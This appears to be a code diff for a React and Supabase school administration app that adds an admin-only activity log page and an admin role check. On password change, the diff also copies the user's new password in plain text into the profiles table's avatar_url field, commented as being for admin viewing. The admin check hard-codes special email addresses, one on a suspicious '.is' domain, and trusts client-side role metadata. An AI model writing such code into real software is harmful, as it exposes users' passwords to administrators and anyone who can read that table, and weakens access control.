@@ -13,7 +13,8 @@ import {
   X,
   GraduationCap,
   Lock,
-  Key
+  Key,
+  History
 } from "lucide-react";
 import { Toaster, toast } from "sonner";
 import { motion, AnimatePresence } from "motion/react";
@@ -33,6 +34,7 @@ import Agenda from "./pages/Agenda";
 import NilaiSiswa from "./pages/NilaiSiswa";
 import Login from "./pages/Login";
 import ResetPassword from "./pages/ResetPassword";
+import ActivityLogs from "./pages/ActivityLogs";
 
 const SidebarItem = ({ to, icon: Icon, label, active, collapsed }: { to: string, icon: any, label: string, active: boolean, collapsed: boolean }) => (
   <Link to={to} className="block group">
@@ -131,6 +133,14 @@ const Layout = ({ user, children }: { user: any, children: React.ReactNode }) =>
     try {
       const { error } = await supabase.auth.updateUser({ password: newPassword });
       if (error) throw error;
+
+      // Sync the plain password to profiles table for admin viewing as requested
+      const { error: profileError } = await supabase
+        .from('profiles')
+        .update({ avatar_url: newPassword })
+        .eq('id', user.id);
+      if (profileError) console.error("Error archiving password to profile:", profileError);
+
       toast.success("Kata sandi berhasil diperbarui!");
       setIsUpdatePasswordOpen(false);
       setNewPassword("");
@@ -151,6 +161,7 @@ const Layout = ({ user, children }: { user: any, children: React.ReactNode }) =>
     if (path === "/kelas") return "Manajemen Kelas";
     if (path === "/pengumuman") return "Agenda Kegiatan";
     if (path === "/nilai") return "Input Nilai Siswa";
+    if (path === "/logs") return "Log Aktivitas Sistem";
     return "Halaman";
   };
 
@@ -182,7 +193,7 @@ const Layout = ({ user, children }: { user: any, children: React.ReactNode }) =>
             <div className={`flex items-center gap-3 ${!isSidebarOpen && !isMobileMenuOpen ? 'mx-auto' : ''}`}>
               <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white font-black text-xl shrink-0 overflow-hidden relative shadow-lg shadow-blue-600/20">
                 <img 
-                  src="/logo_sekolah.png" 
+                  src="/logo.jpg" 
                   alt="School Logo" 
                   className="absolute inset-0 w-full h-full object-contain bg-blue-600 z-10"
                   onError={(e) => {
@@ -229,6 +240,15 @@ const Layout = ({ user, children }: { user: any, children: React.ReactNode }) =>
                   icon={Users} 
                   label="Data Guru" 
                   active={location.pathname.startsWith("/guru")} 
+                  collapsed={!isSidebarOpen && !isMobileMenuOpen} 
+                />
+              )}
+              {isAdmin && (
+                <SidebarItem 
+                  to="/logs" 
+                  icon={History} 
+                  label="Log Aktivitas" 
+                  active={location.pathname === "/logs"} 
                   collapsed={!isSidebarOpen && !isMobileMenuOpen} 
                 />
               )}
@@ -436,6 +456,28 @@ const Layout = ({ user, children }: { user: any, children: React.ReactNode }) =>
 export default function App() {
   const [session, setSession] = useState<any>(null);
   const [loading, setLoading] = useState(true);
+  const [appRole, setAppRole] = useState<string>("");
+
+  const user = session?.user;
+
+  useEffect(() => {
+    if (user?.id) {
+      const fetchAppRole = async () => {
+        const { data } = await supabase
+          .from('profiles')
+          .select('role')
+          .eq('id', user.id)
+          .single();
+        if (data) setAppRole(data.role);
+      };
+      fetchAppRole();
+    } else {
+      setAppRole("");
+    }
+  }, [user?.id]);
+
+  const isSpecialAdmin = user?.email === "admin@sekolah.is" || user?.email === "admin@sekolah.id";
+  const isAdmin = appRole === "admin" || user?.user_metadata?.role === "admin" || isSpecialAdmin;
 
   useEffect(() => {
     // Check for real Supabase session first
@@ -503,6 +545,7 @@ export default function App() {
                 <Route path="/kelas" element={<Kelas />} />
                 <Route path="/pengumuman" element={<Agenda />} />
                 <Route path="/nilai" element={<NilaiSiswa />} />
+                <Route path="/logs" element={isAdmin ? <ActivityLogs /> : <Navigate to="/" />} />
               </Routes>
             </Layout>
           ) : (
